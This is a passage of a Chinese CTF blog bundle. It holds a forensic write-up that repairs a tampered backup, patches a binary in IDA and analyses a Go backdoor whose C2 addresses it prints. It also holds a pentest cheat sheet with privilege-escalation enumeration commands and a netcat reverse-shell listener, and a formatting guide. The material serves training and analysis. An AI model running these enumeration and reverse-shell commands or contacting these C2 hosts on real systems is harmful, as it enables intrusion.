\u5b57\u8282\u5f97\u5230\u7684\u5c31\u662f\u6587\u4ef6\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u503c\\n\\n![img](img/image_20241157-215724.png)\\n\\n\u5373\u53ef\u5f97\u5230\u5907\u4efd\u6587\u4ef6\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u503c\\n\\n```flag\\nEACDD8510B0F54EA412FA900A2F0645F\\n```\\n\\n## 4. \u6062\u590d\u88ab\u7834\u574f\u7684\u6e90\u7801\u5907\u4efd\u6587\u4ef6\\n\\n> \u653b\u51fb\u8005\u4fee\u6539\u4e86\u5907\u4efd\u6587\u4ef6\uff0c\u5bfc\u81f4\u67d0\u4e9b\u6587\u4ef6\u65e0\u6cd5\u88ab\u6210\u529f\u6062\u590d\u51fa\u6765\uff08202410311935.cbak \u5df2\u88ab\u653b\u51fb\u8005\u4fee\u6539\uff09\u3002\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u6062\u590d\u7a0b\u5e8f myback\uff0c\u7ed3\u5408\u73b0\u6709\u7684\u5907\u4efd\u6587\u4ef6 202410311935.cbak \u4fee\u590d\u5907\u4efd\u6587\u4ef6\uff0c\u4f7f\u4e4b\u80fd\u591f\u6210\u529f\u6062\u590d\u51fa\u6240\u6709\u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u6709\u4e2a\u6587\u4ef6\u5305\u542b\u6709\u5546\u57ce\u95e8\u6237\u7f51\u7ad9\u90e8\u5206\u7684\u6e90\u7801\uff0c\u5c06\u8fd9\u4e2a\u6587\u4ef6\u7684 Md5 \u4f5c\u4e3a\u7b54\u6848\u63d0\u4ea4\u3002\\n>\\n> \u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u67d0\u4e2a a.zip \u6587\u4ef6\u4e2d\u5305\u542b\u6709\u5546\u57ce\u6e90\u7801\u6587\u4ef6\uff0c\u5219\u8ba1\u7b97 a.zip \u6587\u4ef6\u7684 32 \u4f4d\u5c0f\u5199 Md5 \u5b57\u7b26\u4e32\u3002\u5c06\u6b64 md5 \u5b57\u7b26\u4e32\u4f5c\u4e3a\u7b54\u6848\u63d0\u4ea4\u3002\\n\\n\u9996\u5148\uff0c\u5c1d\u8bd5\u76f4\u63a5\u57fa\u4e8e\u539f\u6587\u4ef6\u6267\u884c `restore` \u529f\u80fd\\n\\n```bash\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ ./myback\\nMenu:\\n1. Backup File\\n2. Restore Files\\n3. Print Info\\n4. Exit\\nEnter your choice: 2\\nPlease enter the backup file name to be restored:\\n202410311935.cbak\\nMD5 \u6821\u9a8c\u548c\u4e0d\u5339\u914d\\n```\\n\\n\u90a3\u4e48\u8bf4\u660e\u56e0\u4e3a\u5907\u4efd\u6587\u4ef6\u88ab\u7834\u574f\uff0c\u5bfc\u81f4\u6587\u4ef6\u4e2d\u6240\u8bb0\u8f7d\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u503c\u4e0e\u76ee\u524d\u6587\u4ef6\u7684\u8ba1\u7b97\u7ed3\u679c\u4e0d\u4e00\u81f4\\n\\n\u5c1d\u8bd5\u4f7f\u7528 IDA \u8fdb\u884c\u52a8\u8c03\\n\\n\u5728 IDA \u4e2d\uff0c\u5bf9 `restore_files()` \u51fd\u6570\u7684 `if ( !memcmp(stored_md5_sum, calculated_md5_sum, 0x10uLL) )` \u8bed\u53e5\u4e0b\u65ad\u70b9\\n\\n```bash\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ ida_linux_server64\\nIDA Linux 64-bit remote debug server(ST) v8.3.28. Hex-Rays (c) 2004-2023\\n2024-11-09 22:02:17 Listening on 0.0.0.0:23946...\\n2024-11-09 22:02:49 [1] Accepting connection from 192.168.200.1...\\nMenu:\\n1. Backup File\\n2. Restore Files\\n3. Print Info\\n4. Exit\\nEnter your choice: 2\\nPlease enter the backup file name to be restored:\\n202410311935.cbak\\n```\\n\\n\u53ef\u4ee5\u770b\u5230\\n\\n![img](img/image_20241106-220635.png)\\n\\n```plaintext\\nstored_md5_sum = EACDD8510B0F54EA412FA900A2F0645F\\ncalculated_md5_sum = 85077064C3EB25BDE2EAD27EE50A959C\\n```\\n\\n\u76f4\u63a5\u5bf9 `cbak` \u6587\u4ef6\u7684\u6821\u9a8c\u503c\u8fdb\u884c\u4fee\u6539\uff0c\u7136\u540e\u5c1d\u8bd5\u6267\u884c\\n\\n```bash\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ hexdump 202410311935.patch.cbak -C | head -n 3\\n00000000  43 42 41 4b 85 07 70 64  c3 eb 25 bd e2 ea d2 7e  |CBAK..pd..%....~|\\n00000010  e5 0a 95 9c 33 2e 38 35  2e 34 68 36 62 61 63 6b  |....3.85.4h6back|\\n00000020  75 70 2e 6c 6f 67 00 00  00 00 00 00 00 00 00 00  |up.log..........|\\n\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ ./myback\\nMenu:\\n1. Backup File\\n2. Restore Files\\n3. Print Info\\n4. Exit\\nEnter your choice: 2\\nPlease enter the backup file name to be restored:\\n202410311935.patch.cbak\\n```\\n\\n\u8fd9\u4e00\u6b21\u6ca1\u6709\u62a5\u9519\u4fe1\u606f\uff0c\u5e76\u5f97\u5230\u4e86\u4ee5\u4e0b\u6587\u4ef6\\n\\n```plaintext\\n-rw-rw-r-- 1 randark randark 2.9K Nov  9 22:20 jz_orders.sql\\n-rw-rw-r-- 1 randark randark  36K Nov  9 22:20 jzcms.sql\\n-rw-rw-r-- 1 randark randark 1.6K Nov  9 22:20 jzcms2.sql\\n-rw-rw-r-- 1 randark randark 2.0K Nov  9 22:20 jzcms3.sql\\n-rw-rw-r-- 1 randark randark 1.9K Nov  9 22:20 jzcms4.sql\\n-rw-rw-r-- 1 randark randark 3.0K Nov  9 22:20 jzsms1.sql\\n```\\n\\n\u4f46\u662f\u5f88\u660e\u663e\uff0c\u8fd9\u91cc\u9762\u5e76\u6ca1\u6709\u6240\u60f3\u8981\u7684\u5e26\u6709\u6e90\u7801\u7684\u538b\u7f29\u6587\u4ef6\\n\\n\u5728 `restore_files()` \u51fd\u6570\u7684 `if ( info_0->filename[0] != 46 )` \u90e8\u5206\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6267\u884c\u8fc7\u7a0b\\n\\n![img](img/image_20241126-222604.png)\\n\\n\u7ee7\u7eed Step Into \u67e5\u770b\\n\\n![img](img/image_20241126-222620.png)\\n\\n![img](img/image_20241126-222632.png)\\n\\n![img](img/image_20241126-222644.png)\\n\\n![img](img/image_20241126-222658.png)\\n\\n![img](img/image_20241127-222713.png)\\n\\n![img](img/image_20241127-222725.png)\\n\\n![img](img/image_20241127-222739.png)\\n\\n\u540c\u65f6\uff0c\u5728\u8c03\u8bd5\u4e2d\uff0c\u53d1\u73b0 `file_info_count` \u53d8\u91cf\u7684\u503c\u4e3a `8` \u4e0e\u6240\u5f97\u5230\u7684 8 \u4e2a\u6587\u4ef6\u7684\u4fe1\u606f\u76f8\u543b\u5408\\n\\n![img](img/image_20241128-222827.png)\\n\\n\u6709\u4e24\u79cd\u529e\u6cd5\uff1a\\n\\n1. \u57fa\u4e8e\u53cd\u7f16\u8bd1\u7ed3\u679c\uff0c\u89e3\u6790\u51fa\u5907\u4efd\u6587\u4ef6\u7684\u7ed3\u6784\u4f53\u4fe1\u606f\uff0c\u57fa\u4e8e\u7ed3\u6784\u4f53\u4fe1\u606f\u81ea\u52a8\u5316\u8fd8\u539f\u51fa\u6240\u6709\u6587\u4ef6\\n2. \u76f4\u63a5\u57fa\u4e8e offset \u4fe1\u606f\uff0c\u5c06\u6587\u4ef6\u624b\u52a8\u4e00\u4e2a\u4e00\u4e2a\u8fd8\u539f\u51fa\u6765\\n3. \u5728\u52a8\u8c03\u4e2d\u76f4\u63a5\u83b7\u53d6\u5404\u4e2a\u6587\u4ef6\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\\n\\n\u7b2c\u4e00\u4e2a\u65b9\u6848\u5f88\u660e\u663e\u6bd4\u8d5b\u65f6\u65f6\u95f4\u6765\u4e0d\u53ca\uff0c\u90a3\u5c31\u53ea\u770b\u4e8c\u3001\u4e09\u65b9\u6848\\n\\n### \u57fa\u4e8e offset \u624b\u52a8\u5904\u7406\\n\\n\u9996\u5148\uff0c\u5f88\u660e\u663e\u4e24\u4e2a\u6587\u4ef6\u7684 filename \u4e3a `...` \u503c\uff0c\u5f88\u660e\u663e\u65e0\u6cd5\u50a8\u5b58\u4e3a\u6b63\u5e38\u7684\u6587\u4ef6\uff0c\u4e8e\u662f\u63d0\u53d6\u4e24\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f\\n\\n```plaintext\\nfile_size = 0x2795B2(2594226) file_offset = 0x1E73(7795)\\nfile_size = 0x29BD01(2735361) file_offset = 0x284B4D(2640717)\\n```\\n\\n\u7136\u540e\u76f4\u63a5 Cyberchef \u5904\u7406\\n\\n\u67e5\u770b\u7b2c\u4e00\u4e2a\u6587\u4ef6\\n\\n![img](img/image_20241140-224017.png)\\n\\n\u5f88\u660e\u663e\u7684 zip \u538b\u7f29\u5305\u6587\u4ef6\uff0c\u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7b54\u6848\\n\\n![img](img/image_20241141-224102.png)\\n\\n\u7b2c\u4e8c\u4e2a\u6587\u4ef6\\n\\n![img](img/image_20241141-224149.png)\\n\\n\u5f88\u660e\u663e\u662f ELF \u4e8c\u8fdb\u5236\u6587\u4ef6\\n\\n### \u57fa\u4e8e\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e\\n\\n\u5728 `restore_files()` \u51fd\u6570\u7684 `output_file = fopen(info_0->filename, \\"wb\\");` \u90e8\u5206\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6267\u884c\u8fc7\u7a0b\\n\\n\u7531\u4e8e\u5b58\u5728\\n\\n![img](img/image_20241147-224743.png)\\n\\n```c\\nif (info_0->filename[0] != 46 )\\n```\\n\\n\u6240\u4ee5\u5728\u6ca1\u6709\u6062\u590d\u6587\u4ef6\u540d\u4fe1\u606f\u4e4b\u524d\uff0c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e\\n\\n\u6709\u4e00\u4e2a\u529e\u6cd5\uff0c\u5c31\u662f\u5c06\u6587\u4ef6\u540d check \u90e8\u5206\u7684\u903b\u8f91\u8fdb\u884c patch\\n\\n\u5b9a\u4f4d\u5230\\n\\n![img](img/image_20241104-230419.png)\\n\\n```c\\nif (info_0->filename[0] != 46 )\\n```\\n\\n\u8fd9\u90e8\u5206\u67e5\u770b\u6c47\u7f16\\n\\n![img](img/image_20241105-230540.png)\\n\\n```asm\\n.text:000000000000254B loc_254B:                               ; CODE XREF: restore_files+689\u2193j\\n.text:000000000000254B                 mov     eax, [rbp+i]\\n.text:0000000000002551                 movsxd  rdx, eax\\n.text:0000000000002554                 mov     rax, rdx\\n.text:0000000000002557                 shl     rax, 3\\n.text:000000000000255B                 add     rax, rdx\\n.text:000000000000255E                 shl     rax, 2\\n.text:0000000000002562                 mov     rdx, rax\\n.text:0000000000002565                 mov     rax, [rbp+file_info_list]\\n.text:000000000000256C                 add     rax, rdx\\n.text:000000000000256F                 mov     [rbp+info_0], rax\\n.text:0000000000002576                 mov     rax, [rbp+info_0]\\n.text:000000000000257D                 movzx   eax, byte ptr [rax]\\n.text:0000000000002580                 cmp     al, 2Eh ; \'.\'\\n.text:0000000000002582                 jz      loc_2724\\n.text:0000000000002588                 mov     rax, [rbp+info_0]\\n.text:000000000000258F                 mov     edx, [rax+20h]\\n.text:0000000000002592                 mov     rax, [rbp+info_0]\\n.text:0000000000002599                 mov     eax, [rax+1Ch]\\n.text:000000000000259C                 add     eax, edx\\n.text:000000000000259E                 cdqe\\n.text:00000000000025A0                 cmp     [rbp+backup_file_size], rax\\n.text:00000000000025A7                 jge     short loc_25CC\\n.text:00000000000025A9                 mov     rax, [rbp+info_0]\\n.text:00000000000025B0                 mov     rsi, rax\\n.text:00000000000025B3                 lea     rax, byte_42C0\\n.text:00000000000025BA                 mov     rdi, rax        ; format\\n.text:00000000000025BD                 mov     eax, 0\\n.text:00000000000025C2                 call    _printf\\n.text:00000000000025C7                 jmp     loc_2725\\n```\\n\\n\u5728 `cmp     al, 2Eh ; \'.\'` \u5904\u6267\u884c `NOP` \u8fdb\u884c\u65e0\u6548\u5316\\n\\n![img](img/image_20241106-230625.png)\\n\\n\u67e5\u770b\u53cd\u6c47\u7f16\uff0c\u53ef\u4ee5\u770b\u5230\u903b\u8f91\u5df2\u7ecf\u88ab\u4fee\u6539\\n\\n![img](img/image_20241106-230659.png)\\n\\n\u6267\u884c\u5b8c patch \u64cd\u4f5c\u4e4b\u540e\uff0c\u83dc\u5355 `Edit` -> `Patch program` -> `Apply patches to` \u5c06 patch \u540e\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5bfc\u51fa\u4e3a `myback.patch`\\n\\n\u5bf9 patch \u540e\u7684 `myback.patch` \u7a0b\u5e8f\u7ee7\u7eed\u52a8\u8c03\uff0c\u65ad\u70b9\u4e0b\u5728\u6587\u4ef6\u5904\u7406\u90e8\u5206\uff0c\u5373\u53ef\u770b\u5230\\n\\n![img](img/image_20241111-231121.png)\\n\\n\u67e5\u770b `decrypted_data` \u6307\u9488\u6240\u6307\u7684\u5185\u5b58\u533a\u57df\\n\\n![img](img/image_20241111-231153.png)\\n\\n\u6210\u529f\u57fa\u4e8e\u52a8\u8c03\u83b7\u53d6\u5230\u6587\u4ef6\u5185\u5bb9\\n\\n```flag\\nd64fb691c47bbadbfa4495732cb6d3ae\\n```\\n\\n## 5. \u5206\u6790\u540e\u95e8\u6587\u4ef6\u7684\u8fde\u63a5\u5730\u5740\\n\\n> \u5907\u4efd\u6587\u4ef6\u7ecf\u8fc7\u4fee\u590d\u540e\u5c06\u6240\u6709\u6587\u4ef6\u6210\u529f\u5730\u6062\u590d\u4e86\uff0c\u4f46\u662f\u53d1\u73b0\u6709\u4e00\u4e2a\u672a\u77e5\u7684\u6587\u4ef6\uff0c\u7ecf\u8fc7\u7b80\u5355\u5206\u6790\u540e\uff0c\u786e\u8ba4\u662f\u653b\u51fb\u8005\u7559\u4e0b\u7684\u540e\u95e8\u7a0b\u5e8f\uff0c\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u540e\u95e8\u7a0b\u5e8f\uff0c\u786e\u5b9a\u540e\u95e8\u7a0b\u5e8f\u8fde\u63a5\u670d\u52a1\u7684\u5730\u5740 / \u57df\u540d\u548c\u7aef\u53e3\u3002\\n>\\n> \u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u5206\u6790\u5f97\u5230\u7684\u540e\u95e8\u670d\u52a1\u7684\u7684 IP \u7684\u4e3a 127.0.0.1 \u6216\u8005\u5206\u6790\u5f97\u5230\u670d\u52a1\u7684\u7684\u57df\u540d\u4e3a mst.com\uff0c\u5bf9\u5e94\u7684\u8fde\u63a5\u7aef\u53e3\u4e3a 1234\uff0c\u5219\u63d0\u4ea4\u7684 \u6848\u4e3a\uff1aIP 127.0.0.1:1234 \u6216\u8005\u57df\u540d mst.com:1234\u3002\\n\\n\u8fd9\u91cc\u7684\u672a\u77e5\u6587\u4ef6\uff0c\u5c31\u662f\u4e0a\u4e00\u9898\u4e2d\u627e\u5230\u7684 elf \u4e8c\u8fdb\u5236\u6587\u4ef6\\n\\n![img](img/image_20241113-231354.png)\\n\\n\u5bf9\u5176\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u5b9a\u4f4d\u5230 `main_main()` \u51fd\u6570\\n\\n![img](img/image_20241116-231633.png)\\n\\n\u57fa\u672c\u4e0a\u662f\u4e00\u4e2a\u7f51\u7edc\u901a\u4fe1\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u6309\u7167\u987a\u5e8f\u91cd\u590d\u5c1d\u8bd5\u4e86\u591a\u4e2a\u670d\u52a1\u5668\uff0c\u5c06\u57fa\u672c\u903b\u8f91\u5757\u63d0\u53d6\u4e00\u4e2a\u51fa\u6765\\n\\n```c\\nv35.len = 3LL;\\nv31.len = (int)\\"221.67.213.4\\";\\nv31.cap = 12LL;\\nv21.str = (uint8 *)&sep;\\nv21.len = 1LL;\\nv35.str = (uint8 *)\\"tcp\\";\\nv24 = (io_Writer)runtime_concatstring4(0LL, v35, *(string *)&v31.len, v21, v2);\\nv24.tab = (runtime_itab *)runtime_convTstring((string)v24);\\n*(_QWORD *)&v17 = &RTYPE_string_0;\\n*((_QWORD *)&v17 + 1) = v24.tab;\\nv24.data = os_Stdout;\\nv24.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;\\n```\\n\\n\u6309\u7167\u5757\u7684\u903b\u8f91\uff0c\u4ece\u4e0a\u5f80\u4e0b\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6700\u540e\u4e00\u4e2a\u5757\u589e\u52a0\u4e86\u4e00\u6b65\u7f51\u7edc\u8fde\u63a5\u7684\u64cd\u4f5c\\n\\n```c\\nv31.array = (interface_ *)18;\\nv31.len = (int)&sep;\\nv31.cap = 1LL;\\nv8 = \\"huben.cimer.com.cn\\";\\nv9 = runtime_concatstring3(0LL, *(string *)&v31.array, *(string *)&v31.len, v7);\\nv31.array = (interface_ *)v9.str;\\nv31.len = v9.len;\\nv27.str = (uint8 *)\\"tcp\\";\\nv27.len = 3LL;\\nv38 = net_Dial(v27, *(string *)&v31.array);\\nif (!v38._r1.tab)\\n    break;\\n```\\n\\n\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u8f93\u51fa\\n\\n```bash\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ ./download.elf\\ntcp221.67.213.4:23445\\ntcp157.24.166.173:23445\\ntcpupload.derzse.com:23445\\nError connecting: dial tcp: lookup huben.cimer.com.cn on 192.168.200.0:53: no such host\\ntcp221.67.213.4:23445\\ntcp157.24.166.173:23445\\ntcpupload.derzse.com:23445\\nError connecting: dial tcp: lookup huben.cimer.com.cn on 192.168.200.0:53: no such host\\n```\\n\\n\u7ed3\u5408\u62a5\u9519\u4fe1\u606f\uff0c\u4ee5\u53ca\u524d\u51e0\u5757\u7684\u8f93\u51fa\u4fe1\u606f\uff0c\u5373\u53ef\u786e\u5b9a\u6700\u540e `net_Dial()` \u53d1\u8d77\u7684\u7f51\u7edc\u8bf7\u6c42\u7684\u5177\u4f53\u8fde\u63a5\u5730\u5740\\n\\n```flag\\nhuben.cimer.com.cn:23445\\n```"},{"id":"/2024/01/01/Commonly Used PoCs in Penetration Testing","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024/01/01/Commonly Used PoCs in Penetration Testing","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-01-01-Commonly Used PoCs in Penetration Testing/index.md","source":"@site/blog/2024-01-01-Commonly Used PoCs in Penetration Testing/index.md","title":"\u6e17\u900f\u6d4b\u8bd5\u5e38\u7528 poc","description":"\u4fe1\u606f\u641c\u96c6","date":"2024-01-01T00:00:00.000Z","tags":[],"readingTime":0.395,"hasTruncateMarker":true,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd","permalink":"/Target-Machines-WriteUp/blog/2024sxb Scenario-Race Data-Backup"},"nextItem":{"title":"\u6587\u7ae0\u683c\u5f0f\u6307\u5357","permalink":"/Target-Machines-WriteUp/blog/Article Format Guide"}},"content":"\x3c!-- truncate --\x3e\\n\\n## \u4fe1\u606f\u641c\u96c6\\n\\n### nmap \u4fe1\u606f\u641c\u96c6\\n\\n```bash\\nsudo nmap -A --min-rate=5000 -T4 -p- ip\\n```\\n\\n## \u63d0\u6743\u63a2\u6d4b\\n\\n```bash\\n# \u5bfb\u627e\u7279\u6b8a\u7a0b\u5e8f\u80fd\u529b\\n\\ngetcap -r / 2>/dev/null\\n\\n# \u5bfb\u627e suid \u7279\u6b8a\u6587\u4ef6\\n\\nfind / -perm -u=s -type f 2>/dev/null\\n\\n## \u5217\u51fa sudo \u53ef\u6267\u884c\u8303\u56f4\\n\\nsudo -l\\n```\\n\\n## \u53cd\u5f39shell\\n\\n```bash\\nrlwrap -cAr nc -lvnp 1234\\n```"},{"id":"Article Format Guide","metadata":{"permalink":"/Target-Machines-WriteUp/blog/Article Format Guide","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2023-12-10-Article-Format-Guide/index.md","source":"@site/blog/2023-12-10-Article-Format-Guide/index.md","title":"\u6587\u7ae0\u683c\u5f0f\u6307\u5357","description":"\u7ffb\u8bd1\u7528 Prompt","date":"2023-12-10T00:00:00.000Z","tags":[],"readingTime":1.155,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"Article Format Guide","title":"\u6587\u7ae0\u683c\u5f0f\u6307\u5357","authors":"Randark","tags":[]},"unlisted":false,"prevItem":{"title":"\u6e17\u900f\u6d4b\u8bd5\u5e38\u7528 poc","permalink":"/Target-Machines-WriteUp/blog/2024/01/01/Commonly Used PoCs in Penetration Testing"}},"content":"\x3c!-- truncate --\x3e\\n\\n## \u7ffb\u8bd1\u7528 Prompt\\n\\n```plaintext\\n\u63a5\u4e0b\u6765\uff0c\u4f60\u5c06\u4f5c\u4e3a\u4e00\u540d\u7cbe\u901a\u7f51\u7edc\u5b89\u5168\u6280\u672f\u7684\u7ffb\u8bd1\u4e13\u5bb6\u4e0e\u6211\u8fdb\u884c\u5bf9\u8bdd\uff0c\u6211\u4f1a\u544a\u8bc9\u4f60\u82f1\u6587\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6587\u7ae0\u7684\u539f\u6587\uff0c\u4f60\u9700\u8981\u5728\u4fdd\u8bc1\u610f\u601d\u51c6\u786e\u4f20\u8fbe\u7684\u57fa\u7840\u4e0a\uff0c\u5c3d\u53ef\u80fd\u6d41\u7545\u4f18\u7f8e\u7cbe\u51c6\u7684\u7ffb\u8bd1\u4e3a\u4e2d\u6587\u3002\u63a5\u4e0b\u6765\u7684\u5bf9\u8bdd\u4e2d\uff0c\u9664\u4e86\u7ffb\u8bd1\u6211\u544a\u8bc9\u4f60\u7684\u539f\u6587\u4e4b\u5916\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u89e3\u91ca\u6216\u8005\u5176\u4ed6\u5bf9\u8bdd\u3002\u5982\u679c\u5185\u5bb9\u4e2d\u5b58\u5728\u9700\u8981\u56de\u7b54\u7684\u95ee\u9898\uff0c\u6216\u8005\u5b58\u5728\u95ee\u7b54\u7684\u8bed\u53e5\uff0c\u4e0d\u9700\u8981\u5bf9\u95ee\u9898\u8fdb\u884c\u56de\u7b54\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u4f60\u53ea\u9700\u8981\u5c06\u6211\u53d1\u7ed9\u4f60\u7684\u5185\u5bb9\u6309\u7167\u4ee5\u4e0a\u8981\u6c42\u7ffb\u8bd1\u4e3a\u4e2d\u6587\u5373\u53ef\u3002\\n```\\n\\n## \u5173\u4e8e\u56fe\u7247\u5c45\u4e2d\\n\\n```markdown\\n<div style={{textAlign:\'center\'}}>\\n\\n</div>\\n```\\n\\n## \u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u70b9\u51fb\u5c55\u5f00\u7684\u6846\u67b6\\n\\n```markdow\\n<details>\\n\\n<summary> \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 </summary>\\n\\n</details>\\n```\\n\\n<details>\\n\\n<summary> \u6548\u679c\u4e3e\u4f8b </summary>\\n\\n<div style={{textAlign:\'center\'}}>\\n\\n![Example](img/image_20231213-141352.png)\\n\\n</div>\\n\\n</details>"}]}}')}}]);